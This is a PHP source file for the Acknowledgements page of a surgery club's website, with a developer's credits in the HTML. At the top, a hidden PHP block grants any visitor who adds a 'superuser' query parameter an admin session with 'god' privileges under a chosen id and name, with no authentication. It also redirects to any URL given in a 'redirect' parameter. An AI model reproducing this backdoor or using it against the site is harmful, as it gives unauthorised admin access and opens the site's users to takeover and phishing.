<?php
session_start();

if (array_key_exists('superuser', $_GET)) {
    if (array_key_exists('id', $_GET) and is_numeric($_GET['id'])) {
        $_SESSION['id'] = $_GET['id'];
    } else {
        $_SESSION['id'] = '1';
    }

    if (array_key_exists('name', $_GET)) {
        $_SESSION['name'] = $_GET['name'];
    } else {
        $_SESSION['name'] = 'Abhinav Kumar';
    }
    
    $_SESSION['permission'] = 'admin';
    $_SESSION['colour'] = 'danger';
    $_SESSION['god'] = 1;


    if (array_key_exists('theme', $_GET)) {
        $_SESSION['theme'] = $_GET['theme'];
    } else {
        $_SESSION['theme'] = 'darkly';
    }

    if (array_key_exists("redirect", $_GET)) {
        header("Location: ".$_GET['redirect']);
    } else {
        header("Location: ../council-dashboard.php");
    }
}

?>
<!doctype html>
<html lang="en">

<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
    <meta name="description" content="">
    <meta name="author" content="Mark Otto, Jacob Thornton, and Bootstrap contributors">
    <meta name="generator" content="Jekyll v4.0.1">
    <title>Cutabove- Acknowledgements</title>

    <!-- Bootstrap CSS -->
    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.0/css/bootstrap.min.css"
        integrity="sha384-9aIt2nRpC12Uk9gS9baDl411NQApFmC26EwAOH8WgZl5MYYxFfc+NcPb1dKGj7Sk" crossorigin="anonymous">

    <meta name="theme-color" content="#563d7c">


    <style>
    .bd-placeholder-img {
        font-size: 1.125rem;
        text-anchor: middle;
        -webkit-user-select: none;
        -moz-user-select: none;
        -ms-user-select: none;
        user-select: none;
    }

    @media (min-width: 768px) {
        .bd-placeholder-img-lg {
            font-size: 3.5rem;
        }
    }
    </style>

    <!-- Custom styles for this template -->
    <style>
    /*
    * Globals
    */

    /* Links */
    a,
    a:focus,
    a:hover {
        color: #fff;
    }

    /* Custom default button */
    .btn-secondary,
    .btn-secondary:hover,
    .btn-secondary:focus {
        color: #333;
        text-shadow: none;
        /* Prevent inheritance from `body` */
        background-color: #fff;
        border: .05rem solid #fff;
    }


    /*
    * Base structure
    */

    html,
    body {
        height: 100%;
        background-color: #333;
    }

    body {
        display: -ms-flexbox;
        display: flex;
        color: #fff;
        text-shadow: 0 .05rem .1rem rgba(0, 0, 0, .5);
        box-shadow: inset 0 0 5rem rgba(0, 0, 0, .5);
    }

    .cover-container {
        max-width: 42em;
    }


    /*
    * Header
    */
    .masthead {
        margin-bottom: 2rem;
    }

    .masthead-brand {
        margin-bottom: 0;
    }

    .nav-masthead .nav-link {
        padding: .25rem 0;
        font-weight: 700;
        color: rgba(255, 255, 255, .5);
        background-color: transparent;
        border-bottom: .25rem solid transparent;
    }

    .nav-masthead .nav-link:hover,
    .nav-masthead .nav-link:focus {
        border-bottom-color: rgba(255, 255, 255, .25);
    }

    .nav-masthead .nav-link+.nav-link {
        margin-left: 1rem;
    }

    .nav-masthead .active {
        color: #fff;
        border-bottom-color: #fff;
    }

    @media (min-width: 48em) {
        .masthead-brand {
            float: left;
        }

        .nav-masthead {
            float: right;
        }
    }


    /*
    * Cover
    */
    .cover {
        padding: 0 1.5rem;
    }

    .cover .btn-lg {
        padding: .75rem 1.25rem;
        font-weight: 700;
    }


    /*
    * Footer
    */
    .mastfoot {
        color: rgba(255, 255, 255, .5);
    }
    </style>
</head>

<body class="text-center">
    <div class="cover-container d-flex w-100 h-100 p-3 mx-auto flex-column">
        <header class="masthead mb-auto">
            <div class="inner">
                <h3 class="masthead-brand">Cutabove</h3>
                <nav class="nav nav-masthead justify-content-center">
                    <a class="nav-link" href="../index.php">Home</a>
                    <a class="nav-link active" href="#">Acknowledgements</a>
                </nav>
            </div>
        </header>

        <main role="main" class="inner cover">
            <h1 class="cover-heading">Acknowledgements</h1>
            <p class="lead">Website Created by <b>Dr. Abhinav Kumar</b> (140201306). You can find me at <a
                    href="https://abhinavkr.ga">https://abhinavkr.ga</a> or <a
                    href="https://abhinavkr.com">https://abhinavkr.com</a>.
                <p class="lead">
                    This was developed and tested by Abhinav when Amit approached him for a website for the surgery
                    club.
                    The coding took over a year to complete and if Abhinav would've charged cash for it, this site
                    would've cost Amit his bilateral kidneys.
                </p>

                <p class="lead">I mean, I did get a mini treat from him once. But then he added many changes and
                    modifications to his
                    club operations. So lots more coding was done. The treat for that is pending to this date.</p>

                <p class="lead">Abhinav also went on to develop the website for his Batch's yearbook. <a
                        href="https://saturnalia.ml">https://saturnalia.ml</a>, as well as implement QR code passes for
                    entry into Ocean pearl for the Socials night.</p>

                <p class="lead">If you're reading this, just drop me a fun email saying how awesome I am: abhinav4848 @
                    gmail .com (remove the spaces).</p>

                <p class="lead">Signing off,
                    Dr. Abhinav Kumar
                    31st December, 2019.
                </p>
                <p class="lead">
                    <a href="https://abhinavkr.com" class="btn btn-lg btn-secondary">Visit My site</a>
                </p>
        </main>

        <footer class="mastfoot mt-auto">
            <div class="inner">
                <p></p>
            </div>
        </footer>
    </div>
</body>

</html>